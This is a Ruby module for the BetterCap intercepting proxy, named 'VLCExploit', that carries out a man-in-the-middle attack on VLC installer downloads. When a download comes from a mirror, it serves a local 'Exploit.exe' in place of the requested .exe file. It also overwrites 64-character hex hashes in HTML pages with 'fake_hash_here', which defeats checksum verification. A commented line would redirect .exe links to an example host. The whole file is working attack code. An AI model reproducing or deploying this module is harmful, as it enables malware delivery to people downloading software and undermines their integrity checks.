class VLCExploit < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'VLCExploit',
    'Description' => 'Replace installation file',
    'Version'     => '1.1',
    'Author'      => "Andrea Draghetti",
    'License'     => 'GPL3'
  )
	def initialize
		opts = BetterCap::Context.get.options.servers
	end
 
	# called after the request is performed
	def on_request(request, response)
		# is it a html page?
		if response.content_type =~ /^text\/html.*/
	#		If you want to make a MiM on the official site use the next regex, otherwise for a MiM on the Mirror the on_pre_request function.
	#		BetterCap::Logger.info "Exploit http://#{request.host}#{request.path}..".green
	#		response.body.gsub! %r/["']http:\/\/*[^\s]+\.(exe)["']/i, "http://www.example.org/Exploit.exe"
			response.body.gsub! /[a-f0-9]{64}/i, "fake_hash_here"
		end
	end
	
	# called before the request is performed
	 def on_pre_request(request)
		@hostname = request.host
		if ( !@hostname.include?("videolan.org") && request.path.include?(".exe") )
			BetterCap::Logger.info "Exploit ;)".green
			response = BetterCap::Proxy::HTTP::Response 
			return response.from_file('/Exploit.exe', 'application/x-msdownload')
		end
	 end
end
